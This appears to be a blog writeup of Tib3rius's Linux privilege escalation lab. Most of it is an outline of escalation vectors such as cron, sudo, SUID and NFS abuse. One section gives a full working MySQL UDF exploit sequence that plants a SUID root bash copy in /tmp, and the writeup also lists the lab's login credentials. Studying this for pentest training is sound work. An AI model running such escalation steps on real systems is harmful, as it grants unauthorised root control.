---
date: '2025-02-01T23:11:45+05:30'
draft: false
title: 'Linux Privilege Escalation Techniques by Tib3rius'
slug: linux-privesc-tib3rius
tags: ["linux", "privesc", "security", "pentesting", "root"]
category: writeups
showtoc: true
summary: A comprehensive guide to Linux privilege escalation techniques including service exploits, weak file permissions, SUID/SGID abuse, and more
description: Detailed walkthrough of various Linux privilege escalation methods demonstrated by Tib3rius, covering everything from basic file permission abuse to advanced kernel exploits
---

# Linux Privilege Escalation Techniques

## Initial Access

Initial access credentials:
- Username: user
- Password: password321

Initial user context:
```bash
user@debian:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
```

## Privilege Escalation Vectors

### 1. Service Exploits

Example: MySQL Root Exploit
- MySQL running as root without password
- Exploited using User Defined Function (UDF)
- Process:
  ```bash
  # Compile the exploit
  gcc -g -c raptor_udf2.c -fPIC
  gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
  
  # Create UDF in MySQL
  mysql -u root
  use mysql;
  create table foo(line blob);
  insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
  select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
  create function do_system returns integer soname 'raptor_udf2.so';
  
  # Escalate privileges
  select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
  /tmp/rootbash -p
  ```

### 2. Weak File Permissions

#### a) Readable /etc/shadow
- Direct access to password hashes
- Can crack passwords offline

#### b) Writable /etc/shadow
- Ability to modify password hashes
- Direct privilege escalation

#### c) Writable /etc/passwd
- Can add new root user
- Modify existing user privileges

### 3. Sudo Exploitation

#### a) Shell Escape Sequences
- Abuse sudo privileges
- Escape restricted shells

#### b) Environment Variables
- Leverage sudo environment
- Path manipulation

### 4. Cron Job Abuse

Three main vectors:
1. File Permissions
   - Writable cron jobs
   - Script modification

2. PATH Environment Variable
   - Path manipulation
   - Command hijacking

3. Wildcards
   - Command injection
   - Parameter abuse

### 5. SUID/SGID Executables

Multiple attack vectors:
1. Known Exploits
   - Documented vulnerabilities
   - Public exploits

2. Shared Object Injection
   - Library manipulation
   - Preload attacks

3. Environment Variables
   - Path manipulation
   - Library preloading

4. Shell Feature Abuse
   - Shell function exploitation
   - Debug mode abuse

### 6. Password & Key Hunting

Key locations to check:
1. History Files
   - .bash_history
   - Command history

2. Config Files
   - Application configs
   - Service configurations

3. SSH Keys
   - Private keys
   - Known hosts

### 7. NFS Exploitation
- Root squashing misconfigurations
- Share permissions abuse

### 8. Kernel Exploits
- Version-specific vulnerabilities
- Local privilege escalation

## Best Practices

1. Always start with non-destructive techniques
2. Document all attempts and findings
3. Verify exploit compatibility before execution
4. Create backups when modifying system files
5. Clean up after successful exploitation

## Tools Used

- LinPEAS
- Linux Exploit Suggester
- Unix Privesc Check
- Linuxprivchecker
- pspy

## References

1. [Tib3rius's Linux Privilege Escalation Guide](https://github.com/Tib3rius)
2. [GTFOBins](https://gtfobins.github.io/)
3. [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
4. [Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
